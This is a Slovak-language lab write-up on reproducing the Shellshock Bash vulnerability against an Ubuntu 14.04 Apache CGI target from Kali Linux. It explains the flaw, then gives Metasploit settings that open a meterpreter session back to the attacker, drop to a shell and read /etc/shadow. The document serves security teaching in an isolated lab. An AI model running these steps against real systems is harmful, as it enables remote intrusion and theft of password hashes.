# Otestovanie zraniteľnosti Shellshock na Ubuntu 14.04

CVE-2014-6271, známe aj ako „Shellshock“, bolo objavené v septembri 2014 bezpečnostným výskumníkom Stéphane Chazelasom. 
Využíva chybu v príkazovom interpretery Bash od verzie 1.14 po 4.3. Zraniteľné boli všetky zariadenia, 
ktoré ho používali. Vzdialenému útoku boli však vystavení iba používatelia, ktorí boli pripojení na internet. Okrem 
toho je potrebný určitý softvér, ktorý poskytuje cestu, cez ktorú sa útočník môže dostať k príkazovému interpreteru 
Bash, napríklad pri webovom serveri Apache je to CGI, ktorý slúži na interakciu s jeho programami. Experti 
vypočítali, že „Shellshock“ sa týkal vyše 500 miliónov zariadení.

Zraniteľnosť vzniká kvôli chybe v spracovaní premenných prostredia v príkazovom interpretery Bash, najmä definície 
funkcií. Toto sa dá zneužiť na vykonanie ľubovoľného kódu, získanie neoprávneného prístupu k systému, poprípade 
vykonanie rôznych útokov, ako napríklad DoS, Code Injection alebo Remote Command Execution.

## Konfigurácia Ubuntu

Pre otestovanie sme si stiahli verziu webového servera Apache verzie 2.4.7 a overili verziu príkazového interpreteru 
Bash, ktorá bola verzie 4.3.8. Následne sme si vytvorili a vložili na server CGI skript, konkrétne `hw.sh`. V súbore 
VAGRANT sme si nastavili adresu IP, na ktorú budeme útočiť: `192.168.50.20`.

## Konfigurácia Kali Linux 

Pre zaútočenie sme si vložili súbor HACK na plochu distribúcie. Prihlásime sa do distribúcie Kali Linux pomocou mena a hesla `vagrant`, otvoríme si terminál a útok spustíme pomocou príkazu: 

```shell
./Desktop/HACK.sh
```

HACK.sh nám otvorí nástroj msfconsole pomocou súboru `set-msfconsole.rc` a nastaví tam IP zraniteľnej mašiny pomocou 
`set RHOSTS 192.168.50.20` a cestu `set TARGETURI /cgi-bin/hw.sh`, čo nám nastaví cestu k skriptu CGI. 
Ostáva nám nastaviť IP útočníka `set LHOSt 192.168.50.21` a spustiť útok.

Vstúpime do interpretačného riadku meterpreter, pomocou príkazu `sell` spustíme konzolu na zraniteľnej distribúcii a skúsime príkazy `whoami` a `cat /etc/shadow`.
